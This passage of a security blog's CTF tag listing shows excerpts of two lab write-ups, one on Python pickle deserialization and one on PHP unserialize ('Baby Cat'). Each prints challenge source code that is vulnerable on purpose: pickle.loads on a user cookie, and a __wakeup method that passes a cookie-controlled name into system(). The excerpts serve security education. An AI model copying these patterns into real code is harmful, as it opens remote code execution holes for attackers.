            &#39;&lt;button&gt;Submit&lt;/button&gt;&lt;/form&gt;&lt;hr&gt;&lt;a href=&#34;/sauce&#34;&gt;Source code&lt;/a&gt;&#39;

    else:
        user = pickle.loads(base64.b64decode(session))
        return f&#39;&lt;p&gt;Name: {user[&#34;name&#34;]}&lt;/p&gt;&lt;p&gt;Age: {user[&#34;age&#34;]}&lt;/p&gt;&#39;


@app.route(&#34;/login&#34;, methods=[&#39;POST&#39;])
def login():
    user = base64.b64encode(pickle.dumps({
        &#34;name&#34;: request.form.get(&#39;name&#39;),
        &#34;age&#34;: int(request.form.get(&#39;age&#39;))
    }))
    resp = make_response(redirect(&#39;/&#39;))
    resp.set_cookie(&#34;session&#34;, user)
    return resp
</code></pre><p>:::</p><a href=/security/course/ntust-ws/deserialization/simple-web-0x16lab---pickle/>...</a></p></article><article class="markdown book-post"><h2><a href=/security/course/ntu-cs/web/simple-web---0x12lab---baby-cat/>Simple Web 0x17(Lab - Baby Cat)</a></h2><div class=text-small><a href=/tags/ntustws/>NTUSTWS</a>,
<a href=/tags/ctf/>CTF</a>,
<a href=/tags/web/>Web</a></div><p><h1 id=simple-web-0x17lab---baby-cat>Simple Web 0x17(Lab - Baby Cat)
<a class=anchor href=#simple-web-0x17lab---baby-cat>#</a></h1><h6 id=tags-ntustws-ctf-web>tags: <code>NTUSTWS</code> <code>CTF</code> <code>Web</code>
<a class=anchor href=#tags-ntustws-ctf-web>#</a></h6><p>Challenge: <a href=http://h4ck3r.quest:8601/>http://h4ck3r.quest:8601/</a></p><h2 id=background>Background
<a class=anchor href=#background>#</a></h2><p><a href=/FkF8p-zrSMSOWFkE4vvAJQ>0x16.5(php unserialize)</a></p><h2 id=source-code>Source code
<a class=anchor href=#source-code>#</a></h2><p>:::spoiler code</p><pre tabindex=0><code class="language-php=" data-lang="php=">&lt;?php
isset($_GET[&#39;source&#39;]) &amp;&amp; die(!show_source(__FILE__));

class Cat
{
    public $name = &#39;(guest cat)&#39;;
    function __construct($name)
    {
        $this-&gt;name = $name;
    }
    function __wakeup()
    {
        echo &#34;&lt;pre&gt;&#34;;
        system(&#34;cowsay &#39;Welcome back, $this-&gt;name&#39;&#34;);
        echo &#34;&lt;/pre&gt;&#34;;
    }
}

if (!isset($_COOKIE[&#39;cat_session&#39;])) {
    $cat = new Cat(&#34;cat_&#34; . rand(0, 0xffff));
    setcookie(&#39;cat_session&#39;, base64_encode(serialize($cat)));
} else {
    $cat = unserialize(base64_decode($_COOKIE[&#39;cat_session&#39;]));
}
?&gt;
&lt;p&gt;Hello, &lt;?= $cat-&gt;name ?&gt;.&lt;/p&gt;
&lt;a href=&#34;/?source&#34;&gt;source code&lt;/a&gt;
</code></pre><p>:::</p><a href=/security/course/ntu-cs/web/simple-web---0x12lab---baby-cat/>...</a></p></article><ul class="pagination pagination-default"><li class=page-item><a href=/tags/ctf/ aria-label=First class=page-link role=button><span aria-hidden=true>&#171;&#171;</span></a></li><li class=page-item><a href=/tags/ctf/page/24/ aria-label=Previous class=page-link role=button><span aria-hidden=true>&#171;</span></a></li><li class=page-item><a href=/tags/ctf/page/23/ aria-label="Page 23" class=page-link role=button>23</a></li><li class=page-item><a href=/tags/ctf/page/24/ aria-label="Page 24" class=page-link role=button>24</a></li><li class="page-item active"><a aria-current=page aria-label="Page 25" class=page-link role=button>25</a></li><li class=page-item><a href=/tags/ctf/page/26/ aria-label="Page 26" class=page-link role=button>26</a></li><li class=page-item><a href=/tags/ctf/page/27/ aria-label="Page 27" class=page-link role=button>27</a></li><li class=page-item><a href=/tags/ctf/page/26/ aria-label=Next class=page-link role=button><span aria-hidden=true>&#187;</span></a></li><li class=page-item><a href=/tags/ctf/page/27/ aria-label=Last class=page-link role=button><span aria-hidden=true>&#187;&#187;</span></a></li></ul><footer class=book-footer><div class="flex flex-wrap justify-between"></div><script>(function(){function e(e){const t=window.getSelection(),n=document.createRange();n.selectNodeContents(e),t.removeAllRanges(),t.addRange(n)}document.querySelectorAll("pre code").forEach(t=>{t.addEventListener("click",function(){if(window.getSelection().toString())return;e(t.parentElement),navigator.clipboard&&navigator.clipboard.writeText(t.parentElement.textContent)})})})()</script></footer><label for=menu-control class="hidden book-menu-overlay"></label></div><aside class=book-toc><div class=book-toc-content><nav><ul><li class=book-section-flat><strong>Categories</strong><ul></ul></li><li class=book-section-flat><strong>Tags</strong><ul><li class="flex justify-between"><a href=/tags/ad/>AD</a>
<span>25</span></li><li class="flex justify-between"><a href=/tags/adworld/>Adworld</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/aegis/>AEGIS</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ai/>AI</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ais3/>AIS3</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/android/>Android</a>
<span>11</span></li><li class="flex justify-between"><a href=/tags/balsnctf/>BalsnCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/book/>Book</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/btlo/>BTLO</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/cggc/>CGGC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/chatgpt/>ChatGPT</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/crewctf/>CrewCTF</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/crypto/>Crypto</a>
<span>36</span></li><li class="flex justify-between"><a href=/tags/cryptography/>Cryptography</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/csc/>CSC</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ctf/>CTF</a>
<span>267</span></li><li class="flex justify-between"><a href=/tags/cyberdefender/>CyberDefender</a>
<span>23</span></li><li class="flex justify-between"><a href=/tags/data-structure/>Data Structure</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/deadfacectf/>DeadFaceCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/digital-forensics/>Digital Forensics</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/drozer/>Drozer</a>
<span>10</span></li><li class="flex justify-between"><a href=/tags/easy/>Easy</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/eductf/>Eductf</a>
<span>85</span></li><li class="flex justify-between"><a href=/tags/endpoint-forensics/>Endpoint Forensics</a>
<span>16</span></li><li class="flex justify-between"><a href=/tags/english-writing/>English Writing</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/forensics/>Forensics</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/general-skill/>General Skill</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/hackthebox/>Hackthebox</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/incident-response/>Incident Response</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/information-security/>Information Security</a>
<span>25</span></li><li class="flex justify-between"><a href=/tags/interview/>Interview</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/latex/>LaTeX</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/leetcode/>LeetCode</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/machine-learning/>Machine Learning</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/malware-reverse-engineering-and-analysis/>Malware Reverse Engineering and Analysis</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/meeting-paper/>Meeting Paper</a>
<span>20</span></li><li class="flex justify-between"><a href=/tags/misc/>Misc</a>
<span>44</span></li><li class="flex justify-between"><a href=/tags/mobsf/>MobSF</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/network-forensics/>Network Forensics</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/nisra/>NISRA</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu/>NTU</a>
<span>67</span></li><li class="flex justify-between"><a href=/tags/ntu_ct/>NTU_CT</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/ntu_ml/>NTU_ML</a>
<span>5</span></li><li class="flex justify-between"><a href=/tags/ntu_mr/>NTU_MR</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/ntu_os/>NTU_OS</a>
<span>4</span></li><li class="flex justify-between"><a href=/tags/ntu_padns/>NTU_PADNS</a>
<span>8</span></li><li class="flex justify-between"><a href=/tags/ntu_st/>NTU_ST</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/ntucns/>NTUCNS</a>
<span>11</span></li><li class="flex justify-between"><a href=/tags/ntust/>NTUST</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/ntustisc/>NTUSTISC</a>
<span>32</span></li><li class="flex justify-between"><a href=/tags/ntustws/>NTUSTWS</a>
<span>29</span></li><li class="flex justify-between"><a href=/tags/nycu/>NYCU</a>
<span>6</span></li><li class="flex justify-between"><a href=/tags/picoctf/>PicoCTF</a>
<span>112</span></li><li class="flex justify-between"><a href=/tags/portswigger-web-security-academy/>Portswigger Web Security Academy</a>
<span>29</span></li><li class="flex justify-between"><a href=/tags/problem-solution/>Problem Solution</a>
<span>28</span></li><li class="flex justify-between"><a href=/tags/pwn/>PWN</a>
<span>57</span></li><li class="flex justify-between"><a href=/tags/reverse/>Reverse</a>
<span>46</span></li><li class="flex justify-between"><a href=/tags/security-operation/>Security Operation</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/side-project/>Side Project</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/software-testing/>Software Testing</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/special-topic/>Special Topic</a>
<span>2</span></li><li class="flex justify-between"><a href=/tags/taiwanholyhigh/>TaiwanHolyHigh</a>
<span>9</span></li><li class="flex justify-between"><a href=/tags/tcivs/>TCIVS</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/threat-intel/>Threat Intel</a>
<span>3</span></li><li class="flex justify-between"><a href=/tags/tools/>Tools</a>
<span>19</span></li><li class="flex justify-between"><a href=/tags/tscctf/>TSCCTF</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/web/>Web</a>
<span>93</span></li><li class="flex justify-between"><a href=/tags/welcome/>Welcome</a>
<span>1</span></li><li class="flex justify-between"><a href=/tags/windows/>Windows</a>
<span>7</span></li><li class="flex justify-between"><a href=/tags/%E5%90%8D%E8%A9%9E%E8%A7%A3%E9%87%8B/>ÂêçË©ûËß£Èáã</a>
<span>10</span></li><li class="flex justify-between"><a href=/tags/%E8%AE%80%E6%9B%B8%E5%BF%83%E5%BE%97/>ËÆÄÊõ∏ÂøÉÂæó</a>
<span>2</span></li></ul></li></ul></nav></div></aside></main></body></html>